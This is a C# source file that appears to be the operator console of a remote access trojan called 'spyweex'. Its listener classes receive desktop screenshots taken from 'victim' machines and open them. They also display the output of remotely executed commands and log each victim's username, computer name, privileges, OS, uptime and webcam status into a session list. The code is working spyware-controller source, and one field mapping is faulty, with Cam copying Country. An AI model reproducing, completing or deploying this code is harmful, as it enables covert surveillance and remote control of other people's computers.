using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.Reactive.Concurrency;
using System.Reactive.Linq;
using System.Threading;
using System.Windows.Threading;
using spyweex_client_wpf.StaticStrings;
using System.Windows;
using System.Windows.Media.Imaging;

namespace spyweex_client_wpf
{
    internal abstract class ISubscriber
    {
        public IDisposable subscriberToken;
        public bool isSubscribed = false;


        //public abstract void Subscribe(ref WxhtpClient wxhtpClient);

        public async void UnsubscribeAsync()
        {
            await Task.Factory.StartNew(() =>
            {
                if (isSubscribed)
                {
                    isSubscribed = false;
                    subscriberToken.Dispose();
                }
            });
        }
    }

    internal class DScreenListener : ISubscriber
    {
        public void Subscribe(ref WxhtpClient wxhtpClient)
        {
            if (isSubscribed) return;
            isSubscribed = true;
            IDisposable idisp = wxhtpClient.GetAsyncTaskExecutor().
                getObservableSequenceOfReponses().
                ObserveOn(TaskPoolScheduler.Default).
                Subscribe(
                response =>
                {
                    Response resp = (Response)response;
                    if (resp.Action.Equals(StaticStrings.ACTION_TYPE.TAKE_DESKTOP_SCREEN))
                    {
                        using (MemoryStream byteStream = new MemoryStream(resp.content))
                        {
                            BitmapImage bi = new BitmapImage();
                            bi.BeginInit();
                            bi.CacheOption = BitmapCacheOption.OnLoad;
                            bi.StreamSource = byteStream;
                            bi.EndInit();

                            JpegBitmapEncoder encoder = new JpegBitmapEncoder();
                            Guid photoID = System.Guid.NewGuid();
                            String photolocation = photoID.ToString() + ".jpg";  //file name 

                            encoder.Frames.Add(BitmapFrame.Create(bi));

                            using (var filestream = new FileStream(photolocation, FileMode.Create))
                                encoder.Save(filestream);

                            byteStream.Close();
                            Process.Start(photolocation);

                        }
                        Debug.WriteLine("Task Completed");
                        UnsubscribeAsync();
                    }
                },
                err =>
                {
                    Debug.WriteLine((Exception)err);
                    MessageBoxResult result = MessageBox.Show("Error occured in Desktop screen subscriber " + (Exception)err);
                    UnsubscribeAsync();
                }

                );
            subscriberToken = idisp;
        }
    }

    internal class CmdExecListener : ISubscriber
    {
        public void Subscribe(ref WxhtpClient wxhtpClient, MainWindow.updateCmdTextBoxDelegate updateCmdTextBox)
        {
            if(isSubscribed) return;
            isSubscribed = true;
            IDisposable idisp = wxhtpClient.GetAsyncTaskExecutor().
                getObservableSequenceOfReponses().
                ObserveOn(TaskPoolScheduler.Default).
                Subscribe(
                response =>
                {
                    Response resp = (Response)response;
                    string result;
                    if (resp.headers.ContainsKey("Encoding"))
                    {
                        Encoding enc = Encoding.GetEncoding(Int32.Parse(resp.headers["Encoding"]));
                        result = enc.GetString(resp.content);
                    }
                    else
                    {
                        result = resp.content.ToString();
                    }

                    updateCmdTextBox("", result);
                    UnsubscribeAsync();

                    //Dispatcher.CurrentDispatcher.BeginInvoke(new Action(
                    //    () =>
                    //    {       
                    //    }
                    //    ));
                    //PrintToCmdTextBox("", result);

                },
                err =>
                {
                    Debug.WriteLine((Exception)err);
                    MessageBoxResult result = MessageBox.Show("Error occured in Command Promt Listener " + (Exception)err);
                    UnsubscribeAsync();
                }

           );
            subscriberToken = idisp;

        }
    }

    /// <summary>
    /// Listener to update session list (viewmodel) on new wxhtpclient received
    /// </summary>
    internal class ConnectionListener : ISubscriber
    {
        public void Subscribe(ConnectionInfoListener cil, ViewModel viewModel, WxhtpServiceServer server)
        {
            if (isSubscribed) return;
            isSubscribed = true;

            IDisposable idisp = server.getObservableSequenceOfConnections().
            ObserveOn(Scheduler.CurrentThread).
            Subscribe(
                async ipEndPointString =>
                {
                    CancellationTokenSource cts = new CancellationTokenSource();
                    CancellationToken ct;
                    ct = cts.Token;
                    WxhtpClient cl = server.TryGetClientByIpEndpoint(Utils.ParseIPEndpoint(ipEndPointString));
                    await cl.ExecuteTask(ct, 
                        cl.getTcpClient().Client.RemoteEndPoint.ToString(), 
                        METHOD_TYPE.GET, 
                        ACTION_TYPE.VICTIM_INFO);
                    cil.Subscribe(viewModel, cl);
                },
                err =>
                {
                    Debug.WriteLine((Exception)err);
                    MessageBoxResult result = MessageBox.Show("Error occured in SessionListener" + (Exception)err);
                }
            );

            subscriberToken = idisp;
        }
    }

    internal class ConnectionInfoListener : ISubscriber
    {
        public void Subscribe(ViewModel viewModel, WxhtpClient wxhtpClient)
        {
            if (isSubscribed) return;
            isSubscribed = true;
            IDisposable idisp = wxhtpClient.GetAsyncTaskExecutor().
                getObservableSequenceOfReponses().
                ObserveOn(TaskPoolScheduler.Default).
                Subscribe(
                response =>
                {
                    string data = response.content.ToString();
                    string[] results = data.Split(new string[] { "%%" }, StringSplitOptions.None);
                    Session s = new Session
                                {
                                    ID = (viewModel.sessions.Count + 1).ToString(),
                                    IP = wxhtpClient.getTcpClient().Client.RemoteEndPoint.ToString(),
                                    Username = results[0],
                                    ComputerName = results[1],
                                    Privileges = results[2],
                                    OS = results[3],
                                    Uptime = results[4],
                                    Country = results[5], // get country by ip
                                    Cam = results[5],
                                    InstallDate = results[6]
                                };
                    viewModel.sessions.Add(s);
                    UnsubscribeAsync();
                },
                err =>
                {
                    Debug.WriteLine((Exception)err);
                    MessageBoxResult result = MessageBox.Show("Error occured in Command Promt Listener " + (Exception)err);
                    UnsubscribeAsync();
                }

           );
            subscriberToken = idisp;
        }
    }
}
